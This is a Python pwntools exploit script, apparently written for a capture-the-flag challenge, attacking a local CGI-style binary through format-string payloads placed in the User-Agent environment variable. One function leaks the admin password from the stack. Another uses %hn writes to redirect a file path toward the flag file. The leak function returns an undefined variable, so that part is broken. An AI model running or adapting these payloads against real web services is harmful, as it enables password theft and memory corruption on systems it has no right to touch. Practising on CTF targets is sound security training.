#!/usr/bin/env python3
from pwn import *
exe = context.binary = ELF('sec.bak')

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break main
break *0x4014b1
break *0x40149d

break *0x40152c
break *0x40176a
break *0x40157c
continue
'''.format(**locals())

def leak_admin_password():
    #  fmt_payload = ""
    #  fmt_payload += "%275$p." # addr of debug str
    #  fmt_payload += "%276$p." # addr of admin pass
    #  fmt_payload += "%277$p." # addr of user pass
    #  fmt_payload += "%278$p"  # confirmation we're at the right place
    #  fmt_payload += "%287$p"  # main stack canary

    fmt_payload = ""
    fmt_payload += "%275$s" # addr of admin pass

    env = {}
    env["HTTP_X_DEBUG"] = "1"
    env["AdminPass"] = "AAAA"
    env["HTTP_X_PASSWORD"] = "BBBB"
    env["HTTP_USER_AGENT"] = "C"*1008  + fmt_payload
    env["REMOTE_ADDR"] = "127.0.0.1"
    env["CONTENT_LENGTH"] = "63"
    io = local(env=env, stdin=PTY)
    io.sendline(b"X"*63)

    io.recvuntil(b"User Agent : </h3>")
    leak = io.recvuntil(b"<").replace(b"<", b"")
    print(leak)
    return password

def do_exploit():
    #  fmt_payload = "%p."*300
    # want to write ../flag -> 0x2e2e 0x2f66 0x6c61 0x67
    # %267\$hn is addr of bard string
    # galf = 67616c66
    # >>> 0x6761
    # 26465
    # >>> 0x6c66
    # 27750
# brag
# flag


    fmt_payload = ""
    fmt_payload += "%27750x%267\$hn" # replace br with fl
    #  fmt_payload += "%26465x%267\$hn" #write first word

    #  fmt_payload = "!!!"
    #  for i in range(267, 272):
        #  fmt_payload += "%"+str(i)+"$p."
    print("PAYLOAD:", fmt_payload)

    env = {}
    env["HTTP_X_DEBUG"] = "1"
    env["workingDir"] = "/home/kali/code/ctf/nessus-2023/braggart/"
    env["AdminPass"] = "AAAA"
    env["HTTP_X_PASSWORD"] = "AAAA"
    env["HTTP_USER_AGENT"] = "C"*1008  + fmt_payload
    print(env["HTTP_USER_AGENT"])
    env["REMOTE_ADDR"] = "127.0.0.1"
    env["CONTENT_LENGTH"] = "0"
    io = local(env=env)
    for line in io.clean().split(b"\n"):
        print(line)

    io.interactive()
    #  io.interactive()

#  leak_admin_password()
do_exploit()
